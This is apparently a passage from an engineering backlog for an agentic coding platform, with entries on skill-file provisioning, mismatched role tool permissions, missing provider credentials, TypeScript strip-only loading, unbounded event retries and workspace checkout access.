**What it costs to leave.** The ten skills are where the platform's provider know-how lives —
`gitlab-mr`, `jira-ticket`, `loki-logs`, `sentry-issue`, `kb`, `ask-human`, `verify-work`,
`mr-description`, `retro`, `file-followup-ticket` (product/13 § "Skills") — so without them every
agent re-derives `glab`/`acli`/LogQL usage from its role prompt, which is precisely the token cost and
the variance the skills exist to remove. Nothing is *broken* today; the cost is deferred capability,
and the risk is the opposite one: writing them before a mount exists produces ten files nobody reads.

**What would make it urgent.** The first real-model run (the same trigger as entry 23): a launcher
transport (Q52) plus a composed `ClaudeRunner`. Until then a mounted skill would be mounted for nobody.

**What done looks like.** Two tiers, so the row is not vacuous and does not wait on Q52 for all of it:
1. the ten skills exist as `packages/prompts/skills/<name>/SKILL.md` with frontmatter whose `name`
   matches the directory (the SDK matches on exactly that), GitLab's dangling `path` resolves, and the
   provider `skill` refs are read by whatever does the copying rather than by nothing;
2. provisioning copies them into the workspace — ~~`.claude/skills/_platform/`~~ (that layout was
   technical/04's and was **falsified by measurement at WP-14a**: the CLI discovers a *plugin*
   directory, `<checkout>/.agentic-run/plugins/agentic/skills/`, and not that path — see the note
   below) — asserted **in a real container** by the WP-14 docker workspace e2e that already exists
   (`test/e2e/workspace/docker-workspace.e2e.test.ts`, `test/e2e/support/docker-workspace.ts`) — the
   files are present, the project's own `.claude/skills` is untouched, and `RunSpec.skills` names them;
3. and the acceptance that a run's model *lists* them is **explicitly out of scope** until a production
   `ClaudeRunner` exists, stated so nobody writes a criterion no one can run.

**Needs measurement** (rule 66, not run here): whether the WP-14 docker workspace e2e can host tier 2
without a new fixture — it exists and provisions a real container, but nobody has checked what it
asserts about workspace contents.

**Depends on.** WP-14 (landed, provisioning), WP-17 (landed, the role prompts these sit beside).
Owner: **WP-14a** in `13-implementation-plan.md`, carved off WP-14 rather than WP-17 or WP-22 because
the deliverable is a **provisioning** step and WP-14 is the row that owns provisioning; WP-22 owns the
image and the compose file, which is where the *layout* question would land if the copy turned out to
belong in the image instead. **And the sentence that had no row at all, said plainly here because it is
the same shape as WP-15a's**: *no plan row composes a production `ClaudeRunner` or `WorkspaceProvider`
into `apps/server`.* Q52 is the transport **question**, not a work package; WP-22 builds images and
compose, not the composition root. Until such a row existed, tier 3 above had nowhere to live and
`apps/server` started no pipeline runs at all. **That row is now WP-15g** (refiner, session 4), and
tier 3 is its criterion rather than this one's; tiers 1 and 2 here still do not wait on it.

> **Refiner note (session 5) — the layout tier 2 specifies is not discovered by the pinned CLI, and the
> entry is RESOLVED at WP-14a pending merge.** Tier 2 above copies the skills into the workspace's
> `.claude/skills/_platform/`, which is technical/04:35's wording, and that line had never been run.
> WP-14a ran it against the `claude` binary `@anthropic-ai/claude-agent-sdk@0.3.267` resolves, by asking
> for a `system`/`init` message and reading the `skills` it reports discovering:
> `.claude/skills/flat-skill/SKILL.md` **is** discovered; the same file one level deeper at
> `.claude/skills/_platform/nested-skill/SKILL.md` is **not** — twice, with two fixtures; a
> `.claude/skills` in a **parent** of the checkout is not discovered either; a plugin directory holding
> `skills/<name>/SKILL.md`, passed as `Options.plugins` (`--plugin-dir`), **is** discovered and
> namespaced `agentic:<name>`; and the **directory** name is the identity, so a `SKILL.md` whose
> frontmatter `name` differs is listed under its directory. So the shipped layout is
> `<checkout>/.agentic-run/plugins/agentic/skills/<name>/SKILL.md` plus one `--plugin-dir`, which is
> better than the flat alternative for two reasons this entry did not anticipate: the platform's ten
> names would otherwise share a namespace with the project's own `.claude/skills` (a repository with its
> own `kb` loses it or shadows ours), and the files would sit where `git add -A` sweeps them into the
> merge request. **technical/04 carries the amendment** — its § "Amendment (WP-14a, 2026-09-13) — where
> the platform's skills actually go, and why not where this page said" — written by WP-14a's
> implementer, so the doc changed first. Tier 1 is met (`packages/prompts/skills/<name>/SKILL.md` × 10,
> GitLab's dangling `skill.path` resolves, the refs are read by the copy), tier 2 is met at the
> corrected path, and tier 3 stays WP-15g's as this entry already says.
>
> **Six sentences still state the old layout, and none of them is the refiner's to change** (rule 83 —
> closing a gap falsifies every sentence that described it, and the sentence nearest the fix is not the
> only one). Counted by grepping this repository for `_platform` rather than by memory: **two in this
> entry** (the evidence paragraph's quotation of technical/04:35, and tier 2), **one in the WP-17 notes**
> under the section "WP-17 — the delimiter first, then the pack; and the eval half that cannot run",
> **three in `13-implementation-plan.md`** — WP-14a's own row, in its description *and* in its acceptance
> criterion, plus WP-15g's row where it names WP-14a's first two tiers. The WP-17 **milestone row** does
> not state a layout, so it needs nothing. The orchestrator owns all of them; the ledger and the plan are
> its files, and `docs/technical/04-agent-runtime.md` is already corrected.
> `docs/TODO.md`'s *"Nothing mounts a platform skill"* item is struck in this same pass. What WP-14a left
> open is filed below as entries **39**, **40** and **41**, and the product decision it took is **Q67**.

### 39. **product/13's least-privilege table and the shipped `TOOLS_BY_ROLE` disagree about the investigator's shell, and the skill table follows the document while the tool table ships** (TODO, small — **no work package owns it**; found by WP-14a, session 5)

**What is wrong.** What the investigator may do is written down twice and the two do not agree.
product/13's least-privilege table gives the role a shell and observability; the table that ships gives
it no shell at all. `SKILLS_BY_ROLE` followed the **product document**, so the investigator's workspace
is provisioned with `loki-logs` and `sentry-issue` — two skills whose entire content is command recipes
— for a role whose SDK tool list cannot run a command.

**Evidence** (measured and recorded by WP-14a's implementer; the refiner read the four sites, no test
run — rule 66).
- `docs/product/13-agents-prompts-skills.md:70`, the row as written:
  `| Investigator | ✔ | – | read-only cmds | – | – | via platform | ✔ | – | ✔ |`
- `packages/application/src/pipeline/planner.ts:96` — `investigator: ['Read', 'Glob', 'Grep'],`
- `packages/application/src/pipeline/planner.ts:139` — the skills row for the same role is
  `['ask-human', 'jira-ticket', 'kb', 'loki-logs', 'sentry-issue']`, and the table's own docblock
  (`:130-134`) states the mismatch rather than hiding it: *"The rows follow product/13 because that is
  the spec and the tools table is the half that is wrong"*.
- The absence is **not** a blanket "no shell for read-only roles" policy: the acceptance tester in the
  same table is `['Read', 'Glob', 'Grep', 'Bash']` (`planner.ts:100`), which is product/13's *tests
  only* row, and the developer holds `Bash` as well.

**Which one is right, and what BD-025 actually decides.** BD-025 §2 settles the *direction* and not the
row: defaults ship per stage, the organisation sets the maximum autonomy, and projects may only narrow
it. A platform table **narrower** than the spec is therefore safe to ship and a table wider than the
spec is what would need a decision — so the code is the conservative half and the **documents** are the
inconsistent pair. It is still a defect, because CLAUDE.md's rule is that the docs win and a deviation
changes the doc first. **Hypothesis, labelled (rule 39): the missing `Bash` is an omission rather than a
recorded cut.** A record was searched for and none was found — WP-17's plan row and the WP-17 notes,
which shipped the planner's other two tables, do not mention `TOOLS_BY_ROLE` at all, and the only
sentence in the tree that weighs the two is the docblock WP-14a wrote while filing this. An absence of
a record is weak evidence, so whoever resolves it should ask the question rather than assume the answer:
if the cut **was** deliberate, the fix is one sentence in product/13 and not a `Bash` grant.

**What it costs to leave.** Two answers to "what may this role do", and the one a reader reaches for
first is the one that has never shipped: an operator reasoning about blast radius from product/13 reads
a row that is not true, and an implementer reasoning from the code reads a role that cannot do what
three of its own skills describe. The narrow cost today is that the investigator's two observability
skills are text it cannot act on; the wider cost is that BD-025 §3's promise of *"read-mostly CLI
access"* has no owner in either table. Widening is not free but is bounded: an SDK `Bash` grant is still
governed by the three-list policy composed per run at `packages/application/src/pipeline/planner.ts:380`
(`narrowCommandPolicy(DEFAULT_COMMAND_POLICY, settings.config.commands)`), so the decision is about
which list the investigator's commands sit in, not about an unguarded shell.

**What "done" looks like.** One of the two documents changes, and a test enumerates the roles against
whichever survives.
1. **Either** product/13's Investigator row loses its shell and its observability tick — and
   `SKILLS_BY_ROLE` drops `loki-logs`/`sentry-issue` for that role, or keeps them and says in the
   docblock why a role with no shell holds two command skills — **or** `TOOLS_BY_ROLE` gains `Bash` for
   the investigator with the command policy's read-only list named in the same change. **The
   orchestrator owns the product/13 amendment**; the refiner writes no product document.
2. **A test that enumerates every role against the table**, because this is rule 68's shape: the tested
   half makes the untested half look covered. Today the only census over the three tables is
   `test/contract/prompts/platform-skills.contract.test.ts` › "%s: is handed no skill it cannot act on"
   whose `required` map names five of the ten skills and maps each onto a **platform** tool
   (`ask-human`→`ask_human`, `kb`→`kb_search`, `gitlab-mr`→`open_mr`,
   `mr-description`→`update_mr_description`, `file-followup-ticket`→`create_followup_ticket`), so no
   skill maps onto an **SDK** tool and the investigator's missing `Bash` cannot fail it. Done means the
   same census covers the SDK half: a skill whose recipes are shell commands is handed only to a role
   holding `Bash`, asserted for every member of `agentRoleSchema.options`.

**Depends on / owner.** Nothing blocks it. **No work package owns it**: WP-14a shipped `SKILLS_BY_ROLE`
and recorded the mismatch deliberately rather than resolving it in a row that was about provisioning,
`TOOLS_BY_ROLE` predates it, and no plan row owns the least-privilege tables. Nearest owner by subject:
the next row that touches `packages/application/src/pipeline/planner.ts`.

### 40. **A platform skill is provisioned by role and never by binding, and the provider skills tell the run about credentials no run has** (TODO, small — one symptom, two causes, and the second is the bigger one; **no work package owns either**; found by WP-14a, session 5)

**What is wrong.** A project with no Loki binding still gets `loki-logs` in its investigator runs, and a
project with every binding still gets skills whose opening sentences promise a credential the run's
environment does not contain.

**Is a skill a capability or prompt material? Prompt material — so mounting one widens nothing**, and
that is read off the shipped workspace rather than assumed. The SDK's `skills` option is *"a context
filter, not a sandbox"* and the restriction is the **copy** (`packages/application/src/ports/workspace.ts:200-209`);
the run's egress allow-list is *the model host (or none, in `local` provider mode) plus the git host*
(`packages/infrastructure/src/workspace/spec.ts:43`), so `logcli` and `sentry-cli` — which the runtime
image does install (`docker/runtime.Dockerfile:138`) — have nowhere to connect even for a role that
holds `Bash`. This entry is therefore **not** a least-privilege defect; it is about text in the model's
context that describes a world the run is not in.

**Evidence** (refiner, session 5 — file reads and one `wc -c`, no test run and no container, rule 66).
- **Cause (a), role-driven copy.** The spec's skill list is built from the run's own list —
  `packages/infrastructure/src/workspace/spec.ts:203` calls `platformSkillsOf(input.spec)`, which reads
  `spec.skills` (`:146`) — and `spec.skills` is the role's row from `SKILLS_BY_ROLE`. Nothing on that
  path reads the project's bindings, and `agentTooling()` is consulted by nobody: a grep for
  `agentTooling` across `packages/application/src/pipeline/planner.ts`, `apps/server/src/agent.ts` and
  `packages/infrastructure/src/workspace/spec.ts` returns nothing, so `AgentTooling.skill` is
  documentary, which is exactly what WP-14a's note says narrowing would change.
- **Cause (b), no run environment carries a provider CLI credential — for any project.** A production
  run's environment is built by `agentRunEnvironment` (`apps/server/src/agent.ts:235-245`), which
  returns `{ env: {}, secretEnvNames: [] }` unless the provider mode is `api` and otherwise exactly
  `{ ANTHROPIC_API_KEY: options.modelApiKey }`. `LOKI_ADDR`/`LOKI_BEARER_TOKEN` are declared on
  `LOKI_AGENT_TOOLING` (`packages/integrations/src/providers/loki/provider.ts:203-220`) and no
  production code reads them; Sentry declares `env: { variables: [] }` on purpose
  (`packages/integrations/src/providers/sentry/provider.ts:175-178`).
- **So all four provider skills assert a credential the run's environment does not contain.**
  `packages/prompts/skills/loki-logs/SKILL.md:8` — *"`logcli` is on the PATH and reads the run's Loki
  credentials from the environment"*; `packages/prompts/skills/sentry-issue/SKILL.md:8-9` — *"The
  credential in the environment is scoped to reading issues and events"*;
  `packages/prompts/skills/jira-ticket/SKILL.md:24` — *"Both CLIs are authenticated for this run with a
  read-scoped credential"*; `packages/prompts/skills/gitlab-mr/SKILL.md:8` — *"`glab` is on the PATH of
  this workspace and is already authenticated for this run"*. The git half is the one with a real mechanism behind it — the
  workspace sets a credential helper (`credential.helper=!agentic-cred`,
  `packages/infrastructure/src/workspace/provider.ts:846-847`), which authenticates **git**. **Needs
  measurement (rule 66, not run here): whether `glab` finds a credential through that helper**, since
  `glab` reads `GITLAB_TOKEN` and nothing sets one; until somebody checks, the honest statement is that
  the sentence is unverified rather than false.
- **What the context actually costs**, so nobody inflates it: the ten files are **2 111–2 635 bytes**
  each (`wc -c` over `packages/prompts/skills/*/SKILL.md`, refiner, 2026-09-13), and what enters a run
  per skill is the frontmatter `description` — one sentence — because the CLI lists a skill's
  description to the model (WP-14a's note, which is why no role prompt names the ten). The body is read
  when the model opens the skill, which is where an absent binding costs a **turn** rather than a line.
  **Needs measurement (rule 66)**: nobody has measured the listing's cost for the developer's ten-skill
  row, nor how often a model opens a skill whose tooling is absent.

**What it costs to leave, and what would make it urgent.** Nothing is broken in this repository today,
because nothing here has run an agent against a model — every green result is through
`FakeClaudeRunner`, which is standing rule 82's whole point, and there is no model credential. The
trigger is the first real-model run, the same one entry **24** names. When it happens, cause (b) makes the four provider
skills misleading for **every** project — an agent that follows them spends a turn discovering the
credential is absent, and `ask_human` is the good outcome — while cause (a) adds one unusable
description per unbound provider.

**What "done" looks like.** The two causes are separable and should not be bundled.
1. **(a)** The copy takes the project's binding set as well as the role, which makes
   `AgentTooling.skill` load-bearing (the registrations already name the skill for GitLab, Loki, Sentry
   and Jira) and needs the binding set at the place the `WorkspaceSpec` is built. The criterion that
   fails today: a run for a project with no Loki binding has no `loki-logs` in `WorkspaceSpec.skills`.
2. **(b)** Either a credential path for the provider CLIs — BD-025 §3's *"narrowly scoped, run-lifetime
   tokens for git push to `agentic/*` and read-mostly CLI access"*, of which only the git half exists —
   or the three sentences become conditional and say the credential may be absent. Note that any
   `SKILL.md` edit moves the run's recorded digest (`skillSetVersionOf` folds the skill set into
   `runs.prompt_version`), so the audit shows the change; no `ROLE_PROMPT_VERSIONS` bump is involved.

**Depends on / owner.** **None owns either half.** (a) is the first consumer of `AgentTooling.skill`;
(b) is a credential broker for CLIs, which no plan row owns (`workspace/broker.ts` mints run-scoped
**git** tokens and is a different thing, as WP-15a's notes already say). Nearest by subject: the row
that next touches the workspace spec, and entry **41**, which is the same question asked about Sentry's
`cli: null`.

### 41. **`sentry-cli` 3.7.0 has the issue commands its own documentation page does not list, and that page is a cited source of the Sentry fixture corpus** (TODO, small — a **provenance** correction, not a defect in the adapter; found by WP-14a, session 5)

**What is wrong.** `SENTRY_AGENT_TOOLING.cli` is `null` and the reason recorded for it is a
documentation read: the vendor's CLI page lists no issue commands. The binary the platform ships has
them. The decision may still be right — what is unverified is the *environment* such a query
authenticates with — but the **citation** behind it has been contradicted by a measurement, and a
contradicted provenance citation is re-derived rather than left standing (CLAUDE.md's fixture-provenance
rule: a fixture you recorded and a fixture you invented are different kinds of evidence, and the
`SOURCES.md` beside a corpus is the statement of what it rests on, *including pages that produced no
fixture*).

**Evidence** (measured by WP-14a's implementer inside `platform-runtime:dev` on 2026-09-13 by reading
`--help`; the refiner read the three sites and ran no container — rule 66).
- The measurement, quoted from the provider's docblock rather than paraphrased
  (`packages/integrations/src/providers/sentry/provider.ts:166-171`): *"`sentry-cli` **3.7.0**, the
  version `docker/runtime.Dockerfile` installs, *does* have `issues list --query --max-rows` and
  `events list` — read from `--help` inside `platform-runtime:dev` on 2026-09-13."*
- The contradicted read, in the same docblock at `:147-150`: the classic `sentry-cli` documents its
  environment *"but **no issue commands at all**: its documented sections are releases, debug files,
  send-event, code mappings, logs, snapshots and crons"*, citing `https://docs.sentry.io/cli/` retrieved
  2026-09-10.
- The corpus statement carries the same claim and **has not been corrected**:
  `test/fixtures/http/sentry/SOURCES.md:75-77` cites `https://docs.sentry.io/cli/` for *"the documented
  command groups of `sentry-cli`"* and states **No `issues` group. No fixture; cited by the
  agent-tooling decision.**
- **Which fixture `source` block needs re-deriving: none, and that is the finding's shape.** No fixture
  under `test/fixtures/http/sentry/` cites the CLI page — a grep for `docs.sentry.io/cli` in that
  directory matches only `SOURCES.md`. The four fixtures (`issues.json`, `issue-search.json`,
  `issue-events.json`, `organization.json`) cite API pages, and nothing measured contradicts those. So
  what is contradicted is the corpus statement's **non-fixture** citation, which is the part the
  provenance contract puts in `SOURCES.md` precisely because no `source` block can carry it.

**What it costs to leave.** Small: a reader who follows the `SOURCES.md` line reaches the page and forms
the same wrong belief. Not small: `cli: null` is what keeps `sentry-cli` out of the run's declared
tooling, and the argument for it now rests partly on a claim the platform's own measurement contradicts
— so the next person re-reads the page, agrees with it, and re-derives the same conclusion from the
wrong reason. WP-14a corrected the **provider docblock** in place (rule 83, the sentence nearest the
fix); the corpus statement is the copy that was missed.

**What "done" looks like.**
1. `test/fixtures/http/sentry/SOURCES.md`'s `https://docs.sentry.io/cli/` line records both facts with
   their dates: the page (retrieved 2026-09-10) lists no `issues` group, and the pinned binary 3.7.0
   has `issues list` and `events list` (`--help` in `platform-runtime:dev`, 2026-09-13). A citation that
   is known to be incomplete and is kept anyway must say so on the line.
2. The tooling decision is re-taken **from the measurement rather than from the page**: either
   `SENTRY_AGENT_TOOLING.cli` stays `null` with the reason restated as *the environment contract is
   unverified* — which is what the docblock now says and what WP-08 decided for Jira — or the
   environment is verified and `cli` is declared. **Needs measurement (rule 66, not run here)**: whether
   `sentry-cli 3.7.0 issues list` authenticates with the four documented variables
   (`SENTRY_AUTH_TOKEN`, `SENTRY_ORG`, `SENTRY_PROJECT`, `SENTRY_URL`), which needs the binary **and** a
   Sentry credential — neither exists in this repository, so this is the same externally-blocked shape
   as WP-17's eval half rather than work that is merely unscheduled.
3. Entry **40**'s cause (b) bounds what a declared `cli` would buy: a run's environment carries at most
   `ANTHROPIC_API_KEY` today, so declaring the CLI changes nothing a run can do until a credential
   reaches it.

**Depends on / owner.** **None.** Nearest by subject: the next row that touches the Sentry adapter or
its fixture corpus. No plan row owns provider tooling declarations, which is the same gap entry **40**
names from the other side.

### 42. **Nothing refuses a TypeScript construct Node's strip-only type stripping cannot strip, and the shipped containers run TypeScript sources** (TODO, small — **no work package owns it**; found by WP-15e, session 5)

**What is wrong.** `verify` is green on code that `pnpm dev`, `pnpm db:migrate`, the server image and
the launcher image cannot load. `tsc` accepts a parameter property, biome accepts it, and vitest
transpiles it away with esbuild; Node's **strip-only** type stripping refuses it — and strip-only is
how this repository's entrypoints run, from source through `scripts/ts-source-resolver.mjs`. The
construct set is small and not exotic: enums, namespaces with values, `declare` fields, parameter
properties.

**Evidence.** Quoted from WP-15e's note rather than paraphrased:

> "It is also one of the few constructs Node's **strip-only** type stripping refuses, and this
> repository runs its sources that way — `pnpm dev`, `pnpm db:migrate` and the runlet shim all go
> through `scripts/ts-source-resolver.mjs`."

> "The only thing that found it was `runlet/conformance.contract.test.ts`, which spawns a real `node`
> on `apps/runlet/src/index.ts`: six cases failing with `c.sock never appeared`, an error that names
> nothing."

Run by hand, the shim printed
`SyntaxError [ERR_UNSUPPORTED_TYPESCRIPT_SYNTAX]: TypeScript parameter property is not supported in strip-only mode`.
The construct was `TaskConcurrentModificationError`, whose class now lives at
`packages/application/src/pipeline/store.ts:99`; all 5 154 unit and contract tests passed with it.

Read off disk by the refiner (reading only, rule 66 — no tier and no container run):
- The accidental guard's message really is about a file, not about syntax:
  `packages/infrastructure/src/runlet/conformance.contract.test.ts:76` throws `` `${file} never appeared` ``.
- **The blast radius is wider than the shim, which the note does not say.** `docker/app.Dockerfile:130`
  is `ENTRYPOINT ["node", "--import", "./scripts/ts-source-resolver.mjs"]` with
  `CMD ["apps/server/src/main.ts"]` at `:131`; `compose.yml:86` runs the migrate service as
  `command: ['apps/server/src/migrate.ts']`; `docker/launcher.Dockerfile:85-86` is the same pair over
  `apps/launcher/src/index.ts`. So the **product images** load `.ts` under strip-only, not only the
  developer commands.
- Exempt, and worth knowing before scoping a fix: `apps/web` is bundled by Vite, and the runlet's own
  image ships the Vite bundle (`docker/runtime.Dockerfile:154` runs `/usr/local/bin/agentic-runlet`,
  built by `apps/runlet/package.json`'s `build`). A repo-wide ban is therefore broader than the runtime
  strictly requires — and is still the cheap direction.
- `tsconfig.base.json` sets `verbatimModuleSyntax: true` and does **not** set `erasableSyntaxOnly`;
  `package.json:74` pins `"typescript": "7.0.2"`.

**What it costs to leave.** Rule 71's shape one layer in: local and CI green rest on the fact that every
tier transpiles, and the one check that does not is a contract test whose failure names a missing
socket. WP-15e's implementer read that failure as machine load **twice** before running the process by
hand. The failure mode is loud when it arrives — a container that exits at startup, or `pnpm dev`
refusing to boot — and completely invisible until then, so the cost is paid by whoever is furthest from
the change: a reviewer, CI's Docker jobs, or an operator.

**What "done" looks like.** Either shape, both scoped to `verify:static` so CI's lint job runs it
(CLAUDE.md's verification contract: a step cannot be in `verify` and missing from CI; the list is
`scripts/verify-targets.ts:33`).
1. `erasableSyntaxOnly: true` in `tsconfig.base.json`, inherited by every ring. **Needs verification,
   not asserted**: the option is documented from TypeScript 5.8 and this repository pins **7.0.2**, so
   whether `tsc --noEmit -p tsconfig.json` accepts it at that version, and what it reports over the
   existing sources, is a `pnpm typecheck` run the refiner did not make (rule 66). If supported, the
   criterion is the flag on, `pnpm typecheck` clean, and a **planted** parameter property failing it by
   name (rule 85's calibration).
2. If the option is unavailable at 7.0.2: a step that starts each strip-only entrypoint under
   `node --import ./scripts/ts-source-resolver.mjs` and fails on `ERR_UNSUPPORTED_TYPESCRIPT_SYNTAX`.
   The entrypoints are discoverable rather than listed by hand — the Dockerfile `CMD`s plus
   `compose.yml`'s migrate command. Weaker than (1): it only covers what an entrypoint actually
   imports at startup, so a module loaded later is not checked.

**Depends on / owner.** **None** — no plan row owns the toolchain configuration, which is why a
`tsconfig` flag nobody set has survived every work package. Nearest by subject: **WP-22** owns the
images and is the row that would otherwise discover this the expensive way. Nothing blocks it; (1) is
one line plus its calibration.

### 43. **A handler that keeps failing is retried for ever, and exhausting WP-15e's conflict bound is a second way in** (TODO — **no work package owns it**; recorded as a WP-04 note since session 1 and never given an entry; restated by WP-15e, session 5)

**What is wrong.** WP-15e bounded the *conflict* retry at three attempts. What happens after the third
is the bus's ordinary failure path, and **that** path has no bound: the failure is recorded, the event
stays queued, the delay doubles to a ceiling, and the sweep picks it up again indefinitely with the
stream's later events behind it. The bound WP-15e added is therefore a bound on *re-running the
handler*, not on the event.

**Evidence.** Quoted from WP-15e's discovered-work bullet:

> "A handler that exhausts `MAX_CONCURRENCY_CONFLICT_ATTEMPTS` falls through to `retryLater`, which has
> no limit and no dead-letter state (WP-04's note, repeated in `transitions.ts`)."

Read by the refiner to settle which of the three shapes it is — the answer is **unbounded in count,
bounded in rate** (reading only, rule 66; no tier run):
- `packages/application/src/events/event-bus.ts:301-322` records the failure and calls
  `retryLater(position, failure.error, this.#backoff)`. No attempt count is consulted, and nothing
  escalates.
- `packages/infrastructure/src/events/postgres-event-store.ts:300-313` is the write:
  `set attempts = attempts + 1, error = $2, available_at = now() + least(base × 2^least(attempts,10), maxMs)`.
  The row is never deleted and no cap is compared.
- The sweep re-selects it at `packages/infrastructure/src/events/postgres-event-store.ts:153`, whose
  predicate is `where h.rn = 1 and h.available_at <= now()`.
- The ceiling at the shipped defaults is `maxRetryDelayMs` **300 000 ms** over `retryDelayMs` **5 000**
  (`packages/infrastructure/src/events/config.ts:63-64`), so a permanently poisoned event is
  re-dispatched roughly **12 times an hour, for ever**.
- The class is already written down, in the WP-04 notes:
  > "Dispatch has no dead-letter state (WP-04). An event whose handler keeps failing is retried with
  > exponential backoff for ever and blocks its stream."

  That note ends *"WP-15 should decide what a permanently poisoned event does to its task"* — and no
  WP-15x row carries that criterion, which is how the sentence survived seven of them.

**Hypothesis, labelled as one (rule 39).** A *persistent* task-version conflict is an implausible
producer: a conflict needs a second writer committing between this transaction's read and its write,
and `MAX_CONCURRENCY_CONFLICT_ATTEMPTS`'s own docblock argues that the shipped configuration cannot
produce three in a row (`APP_DISPATCH_MAX_CONCURRENCY` 1, every pipeline job worker at concurrency 1).
So WP-15e adds a **second door into an old room** rather than a new live defect. **Needs measurement**
(not run here): no tier asserts what the dispatcher does after a fixed number of failures, so the
"for ever" above is read from the code and the defaults, not observed.

**What would make it urgent.** A producer that fails **deterministically** — a payload no handler can
process, a schema change under a queued event, an integration permanently answering 403. Backlog
entry **1** (nothing produces production load yet) is the only reason this is scheduled rather than
live.

**What it costs to leave.** The stream stalls and the signal is thin: `handler_executions.status = 'failed'`
and the `event_dispatch_pending` gauge (`apps/server/src/metrics.ts:76`), which cannot tell one poisoned
event apart from a busy queue. For a task stream that is a task that stops moving with no error on it —
the same symptom rule 79's measurement produced from a different cause, which is exactly why a second
producer of it is worth an entry rather than a note.

**What "done" looks like.** Two halves, and only the first is engineering.
1. A bound on the dispatch attempt itself: a maximum `attempts` after which the event leaves the queue
   into a terminal state rather than being rescheduled, asserted by a test that fails a handler a fixed
   number of times and shows the stream moving on afterwards.
2. **What a human sees** is a product decision and is the part to put in `docs/OPEN-QUESTIONS.md` when
   someone schedules this — filed here rather than there so the evidence stays in one place.
   **Recommendation, stated strongly enough to implement without a further round**: reuse Q59's answer
   rather than inventing a state — the task escalates to `needs_human` with a brief naming the event and
   the handler, exactly as `escalateTaskAfterConflict` already does for an exhausted conflict, and the
   dead event is visible in the ops view. **No new task state**, and no new escalation vocabulary.

**Depends on / owner.** **None.** WP-04 produced the behaviour and pointed at "WP-15"; no WP-15 row took
it. Related: entry **1** (no production load, so no producer today), and WP-15c's own unbounded-retry
fix, which closed this shape for the **inbound** path only.

### 26. **Composing the workspace provider does not give WP-18 a checkout it can read** (**DECIDED** by architect ruling, session 5 — **TD-026**; the work is on the rewritten **WP-18** row, and this entry closes when that row merges)

> **Ruling recorded under "Architect ruling (WP-18 / backlog 26, session 5)"**: shape (a), sharpened — a
> git-backed `VaultSource` over a bare mirror the **platform** owns and fetches itself, never the
> launcher's `repo-cache` ((c) refused on freshness: that mirror advances only before a run, so the
> after-merge trigger would index a tree without the merge) and never a provider read per file ((b)
> refused on surface and cost). The three *needs measurement* items that remain are listed there.

**What is wrong.** WP-18's plan row defers the `KnowledgeIndexer` job because it *"needs a checkout to
read, which needs the workspace provider, which needs WP-15c's ingress"*. The ingress landed and WP-15g
composes the workspace provider — and **neither hands WP-18 a checkout it can read**. The only
`VaultSource` adapter reads the **server process' own filesystem**; the platform's checkouts live on
Docker volumes that process does not mount. So the dependency arrow from WP-18 to the provider must not
be read as "solved once WP-15g lands".

**Evidence** (refiner, session 4, reading only). `FilesystemVaultOptions.rootPath` is documented
*"Absolute path of the checkout."* (`packages/infrastructure/src/knowledge/filesystem-vault.ts:47-48`)
and the adapter walks it with `node:fs/promises` — `readdir`, `readFile`, `stat` (`:29`). TD-021 §
Decision puts the run's tree on `ws-<id>` rw at `/work` **inside the run container** and the project's
bare mirror on the cache volume ro at `/cache`; the launcher mounts only the **control** volume into its
own filesystem (`apps/launcher/src/config.ts:115`, `APP_WORKSPACE_CONTROL_ROOT`). `createFilesystemVaultSource`
(`filesystem-vault.ts:87`) has **no** production caller — grep finds the definition and its own test.

**What it costs to leave.** WP-18 wires the job, discovers at implementation time that its adapter can
see no repository, and either invents a path in the composition root or redesigns the read mid-work-package.
The first failure is **silent**: a missing directory is `{status:'unavailable'}`, and the indexer then
*correctly* leaves the index alone rather than failing (`packages/application/src/knowledge/indexer.ts:25`,
*"It never empties the index because a read failed"*), so a job that indexes nothing looks exactly like a
project with nothing to index.

**What "done" looks like.** WP-18 **states** where its checkout comes from instead of assuming one: a
server-side clone of its own (one more copy per project, and it needs a credential the pipeline mints), a
default-branch read through `GitProviderPort` with no checkout at all (no volume, but every file is a
provider call), or mounting the cache volume read-only into the server's container (cheapest at run time,
widens the server's mounts, pins the deployment to one machine). **Needs measurement** for the third
(rule 66, not run here): whether the bare mirror alone can answer `VaultSnapshot.repoPaths` and read the
four indexed path classes with no working tree.

**Depends on / owner.** **WP-18** owns it; no other row does. WP-15g's criteria are all about a *run*, so
it neither discharges this nor is blocked by it.

### 27. **The real `attach` handshake is exercised only against stand-in images, and nothing makes the shim start late — so the fix WP-15g shipped is unguarded exactly where the real image changes the timing** (**RESOLVED** at `2fa285c`, WP-22, judged on Linux by CI `34709029809`)

> **RESOLVED, session 5.** Both measurements this entry asked for are taken. (1) The existing e2e attach
> case does **not** kill the one-look mutant — with `#waitForControlSocket` shortened to a single look it
> passed (6913 ms), certifying the happy path and not the wait; the new case *"attaches to a workspace
> whose socket appears only after attach"* forces the ordering (remove the socket, `attach`, `docker
> restart`) and fails by name. (2) The local tier and the shim: the shim **refused to start** on this
> machine's bind-backed control volume because `chmod 0600` on a socket answers `EINVAL` on virtiofs,
> which is why WP-15g's `PASS: verify:e2e (83)` and the recorded EINVAL could both be true — the old
> stand-in booted the shim slowly enough that `attach` inspected a container still starting; the real
> image exposed it, and the shim now checks the property (`0700` run directory, this uid) instead of the
> call. The stand-ins are gone from `test/e2e/workspace/docker-workspace.e2e.test.ts`; CI builds the
> commit's images and a missing one throws rather than skips.

**What is wrong, and one claim corrected first.** The resume note and WP-15g's reviewer both say *"the
contract suite runs the real provider only behind a daemon and the absent `platform-runtime` image — the
readiness handshake will stay mutation-blind until WP-22"*, which the ledger then shortened to "no test tier
exercises the real `DockerWorkspaceProvider.attach`". **That shorter claim is false**, and the accurate gap
is narrower and worth having stated precisely rather than re-derived.

**Evidence** (refiner, session 4 — grep and `gh run view`, no test run, rule 66).
- **A tier does exercise the real `attach`, and CI runs it.** In CI run `34671529213` (`d6ebe2d`) and
  `34671397340` (`5b01f73`), job `e2e-fake-claude` on `ubuntu-latest` ran
  `test/e2e/workspace/docker-workspace.e2e.test.ts (40 tests)` including
  `DockerWorkspaceProvider — WorkspaceProvider contract (14)` › **"attaches to a running workspace with a
  control socket and a token" (8495 ms)** and "refuses to attach after the workspace has been killed"
  (6554 ms). The provider under those cases is the real `DockerWorkspaceProvider` against a real daemon
  (`test/e2e/support/docker-workspace.ts:345`, a `RecordingDockerEngine` on `/var/run/docker.sock`).
- **What it runs against is stand-ins**, and that is the honest gap: `RUNTIME_IMAGE = node:24-alpine`
  (`test/e2e/support/docker-workspace.ts:51`) with this repository bind-mounted at `/repo` so the shim can be
